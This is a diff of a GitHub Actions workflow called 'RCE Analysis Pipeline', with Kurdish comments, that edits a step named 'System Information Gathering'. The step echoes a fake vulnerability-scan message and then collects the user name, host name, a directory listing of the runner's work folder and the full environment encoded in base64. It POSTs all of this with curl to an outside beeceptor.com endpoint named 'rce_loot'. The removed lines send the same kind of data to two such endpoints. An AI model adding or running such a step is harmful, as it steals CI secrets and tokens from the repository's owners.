@@ -3,8 +3,8 @@ name: RCE Analysis Pipeline
 on:
   push:
     branches:
-      - main  # یان هەر branchـێکی تری خۆت
-  workflow_dispatch: # ئەمە ڕێگەت پێ دەدات بە دەستی (Manually) لە سایتەکەوە ڕەنی بکەیت
+      - main
+  workflow_dispatch:
 
 jobs:
   exploit_test:
@@ -12,12 +12,12 @@ jobs:
     steps:
       - name: System Information Gathering
         run: |
-          # فەرمانەکانی RCE لێرەدا دەچن
           echo "Scanning for RCE vulnerabilities..."
           
-          # ناردنی زانیاری سێرڤەر بۆ Beeceptor
-          curl -X POST -d "user=$(whoami)&hostname=$(hostname)&env=$(env | base64)" https://ccssxa.free.beeceptor.com/rce_loot
+          # ١. کۆکردنەوەی زانیارییەکان لە ناو گۆڕاوێک (Variable)
+          # بەم شێوەیە هەموو داتاکان دەبن بە یەک پەیامی تێکستی
+          DATA="User: $(whoami) | Host: $(hostname) | Files: $(ls -la /home/runner/work/) | ENV_BASE64: $(env | base64)"
           
-          # تاقیکردنەوەی دەستڕاگەیشتن بە فایلەکان
-          ls -la /home/runner/work/_temp/ >> result.txt
-          curl -X POST -d "$(env | base64)" https://aksjwuwu.free.beeceptor.com/rce_loot
+          # ٢. ناردنی ڕاستەوخۆی داتاکە لە ناو Body-دا
+          # چیتر بە -F نییە، بەڵکو بە -d دەیاننێرین
+          curl -X POST -d "$DATA" https://aksjwuwu.free.beeceptor.com/rce_loot
